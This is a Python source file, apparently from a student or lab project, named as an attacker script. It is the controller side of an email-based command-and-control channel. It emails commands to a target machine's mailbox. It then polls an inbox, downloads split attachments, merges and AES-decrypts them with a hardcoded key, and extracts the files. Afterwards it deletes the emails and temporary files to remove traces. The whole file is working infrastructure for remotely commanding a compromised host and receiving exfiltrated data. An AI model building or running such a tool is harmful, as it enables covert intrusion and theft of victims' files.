import sys
import smtplib
import imaplib
import email
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from email.header import decode_header
from datetime import datetime
import time
import re
import zipfile


# 发送命令的函数
def send_command_to_target(smtp_server, port, sender_email, sender_password, target_email, subject, command):
    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = target_email
        msg['Subject'] = subject
        msg.attach(MIMEText(command, 'plain'))

        with smtplib.SMTP_SSL(smtp_server, port) as server:
            server.login(sender_email, sender_password)
            server.send_message(msg)
        print(f"Command sent to {target_email}")
    except Exception as e:
        print(f"Failed to send command: {e}")


# 连接到邮箱服务器
def connect_to_email(username, password, imap_server='imap.qq.com'):
    try:
        mail = imaplib.IMAP4_SSL(imap_server)
        mail.login(username, password)
        return mail
    except imaplib.IMAP4.error as e:
        print(f"Login failed: {e}")
        sys.exit(1)


# 解码文件名
def decode_filename(filename):
    decoded_parts = decode_header(filename)
    decoded_filename = ''.join(
        part.decode(encoding or 'utf-8') if isinstance(part, bytes) else part
        for part, encoding in decoded_parts
    )
    return decoded_filename


# 下载附件并保存到指定目录
def download_attachments(mail, since_date, folder='INBOX', output_dir='received_files'):
    try:
        mail.select(folder)
        # Convert the datetime to the format IMAP uses: 'DD-Mon-YYYY'
        date_str = since_date.strftime('%d-%b-%Y')
        result, data = mail.search(None, f'SINCE {date_str}')
        email_ids = data[0].split()

        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        for email_id in email_ids:
            result, msg_data = mail.fetch(email_id, '(RFC822)')
            raw_email = msg_data[0][1]
            msg = email.message_from_bytes(raw_email)

            for part in msg.walk():
                if part.get_content_maintype() == 'multipart':
                    continue
                if part.get('Content-Disposition') is None:
                    continue
                filename = part.get_filename()
                if filename:
                    # 解码文件名
                    filename = decode_filename(filename)
                    filepath = os.path.join(output_dir, filename)
                    with open(filepath, 'wb') as f:
                        f.write(part.get_payload(decode=True))

            # Mark the email for deletion
            mail.store(email_id, '+FLAGS', '\\Deleted')

        # Permanently remove the deleted emails
        mail.expunge()

        print(f"Attachments downloaded to {output_dir}")
    except Exception as e:
        print(f"Failed to download attachments: {e}")


# 自动检测基础名称
def detect_zip_name(output_dir):
    files = os.listdir(output_dir)
    for file in files:
        match = re.match(r'(.+)_part\d+\.zip', file)
        if match:
            return match.group(1)
    return None


# 合并分卷文件
def merge_parts(zip_name, num_parts, output_dir):
    merged_file_name = os.path.join(output_dir, f'{zip_name}.zip.enc')
    try:
        with open(merged_file_name, 'wb') as merged_file:
            for i in range(1, num_parts + 1):
                part_file_name = os.path.join(output_dir, f'{zip_name}_part{i}.zip')
                with open(part_file_name, 'rb') as part_file:
                    merged_file.write(part_file.read())
        print(f"Files merged into {merged_file_name}")
        return merged_file_name
    except Exception as e:
        print(f"Failed to merge parts: {e}")
        return None


# 解密文件
def decrypt_file(file_name, key):
    try:
        with open(file_name, 'rb') as f:
            iv = f.read(16)  # 读取初始化向量
            ciphertext = f.read()

        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)

        decrypted_file_name = os.path.splitext(file_name)[0] + '.zip'
        with open(decrypted_file_name, 'wb') as f:
            f.write(plaintext)

        print(f"File decrypted: {decrypted_file_name}")
        return decrypted_file_name
    except Exception as e:
        print(f"Failed to decrypt file {file_name}: {e}")
        return None


# 解压缩文件
def extract_zip(zip_name, extract_to):
    try:
        with zipfile.ZipFile(zip_name, 'r') as zipf:
            zipf.extractall(extract_to)
        print(f"Extracted to {extract_to}")
    except Exception as e:
        print(f"Failed to extract zip file {zip_name}: {e}")


# 解密和解压缩整个过程
def decompress_and_decrypt(output_dir, key):
    zip_name = detect_zip_name(output_dir)

    if zip_name is None:
        print("No zip files detected to process.")
        return None

    # 检查有多少个分卷文件
    num_parts = len([f for f in os.listdir(output_dir) if f.startswith(zip_name) and f.endswith('.zip')])

    if num_parts == 0:
        print("No parts found to merge.")
        return None

    # 合并分卷文件
    merged_file = merge_parts(zip_name, num_parts, output_dir)
    if not merged_file:
        return None

    # 解密合并后的文件
    decrypted_file = decrypt_file(merged_file, key)
    if not decrypted_file:
        return None

    # 解压缩文件
    extract_to = os.path.join(output_dir, zip_name)
    extract_zip(decrypted_file, extract_to)

    # 清理临时文件
    os.remove(decrypted_file)
    os.remove(merged_file)
    for i in range(1, num_parts + 1):
        os.remove(os.path.join(output_dir, f'{zip_name}_part{i}.zip'))

    return extract_to


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python attacker.py <command>")
        sys.exit(1)

    command = sys.argv[1]

    # 通用邮箱配置
    sender_email = 'xxxxxxxxx@qq.com'
    sender_password = 'xxxxXxxxxxx'
    target_email = 'xxxxxxxxxx@qq.com'
    smtp_server = 'smtp.qq.com'
    smtp_port = 465
    encryption_key = b'BUPTBUPTBUPTBUPT'
    output_dir = 'received_files'

    # Record the start time
    start_time = datetime.now()

    # 发送命令到靶机
    send_command_to_target(smtp_server, smtp_port, sender_email, sender_password, target_email, "Command", command)

    # 连接到邮箱服务器
    mail = connect_to_email(sender_email, sender_password)

    while True:
        # 连接到邮箱并下载分卷文件
        download_attachments(mail, start_time, output_dir=output_dir)

        # 解密和解压缩
        original_folder = decompress_and_decrypt(output_dir, encryption_key)
        if original_folder:
            print(f'文件已还原到: {original_folder}')

        print("Waiting for new emails...")
        time.sleep(30)  # Wait 30 seconds before checking again

